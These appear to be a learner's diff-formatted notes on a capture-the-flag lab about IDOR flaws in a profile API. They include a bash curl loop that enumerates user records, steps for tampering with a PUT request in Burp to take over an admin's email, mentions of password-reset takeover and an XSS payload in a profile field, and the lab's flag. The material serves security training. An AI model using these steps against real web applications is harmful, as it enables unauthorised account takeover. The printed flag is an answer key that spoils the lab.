@@ -1,1 +1,67 @@
 
+Building off of last section... 
+
+This provides us with new details, most notably the uuid, which we could not calculate before, and thus could not change other users' details.
+
+Modifying Other Users' Details
+Now, with the user's uuid at hand, we can change this user's details by sending a PUT request to /profile/api.php/profile/2 with the above details along with any modifications we made, as follows:
+
+We don't get any access control error messages this time, and when we try to GET the user details again, we see that we did indeed update their details: 
+
+Meaning we are able to modify their email address. 
+
+In addition to allowing us to view potentially sensitive details, the ability to modify another user's details also enables us to perform several other attacks. One type of attack is modifying a user's email address and then requesting a password reset link, which will be sent to the email address we specified, thus allowing us to take control over their account. Another potential attack is placing an XSS payload in the 'about' field, which would get executed once the user visits their Edit profile page, enabling us to attack the user in different ways.
+
+Chaining Two IDOR Vulnerabilities
+Since we have identified an IDOR Information Disclosure vulnerability, we may also enumerate all users and look for other roles, ideally an admin role. Try to write a script to enumerate all users, similarly to what we did previously.
+
+Once we enumerate all users, we will find an admin user with the following details:
+
+
+{
+    "uid": "X",
+    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
+    "role": "web_admin",
+    "full_name": "administrator",
+    "email": "webadmin@employees.htb",
+    "about": "HTB{FLAG}"
+}
+
+
+CHALLENGE: 83.136.252.185:30778
+
+Question 1 -  Try to change the admin's email to 'flag@idor.htb', and you should get the flag on the 'edit profile' page.
+1) use the script below to find the uid of admin 
+
+#!/bin/bash
+
+for uid in {1..10}; do
+	curl -s "http://83.136.252.185:30778/profile/api.php/profile/$uid"; echo
+done
+
+2) in terminal -> bash admin.sh | grep "admin" | jq . 
+3) we se the uid for admin is 10 as well as the following information: 
+{
+  "uid": "10",
+  "uuid": "bfd92386a1b48076792e68b596846499",
+  "role": "staff_admin",
+  "full_name": "admin",
+  "email": "flag@idor.htb",
+  "about": "Never gonna give you up, Never gonna let you down"
+}
+
+4) now go to http://83.136.252.185:30778 & have burp open
+5) once the webpage loads, go to edit profile -> then enable burp in the browser -> hit update profile and catch the PUT request
+6) inside the put request replace the current uid and other info with: 
+
+{
+  "uid": "10",
+  "uuid": "bfd92386a1b48076792e68b596846499",
+  "role": "staff_admin",
+  "full_name": "admin",
+  "email": "flag@idor.htb",
+  "about": "Never gonna give you up, Never gonna let you down"
+}
+7) hit send -> get 200 response 
+8) turn burp off on web browser and hit refresh 
+9) HTB{1_4m_4n_1d0r_m4573r}
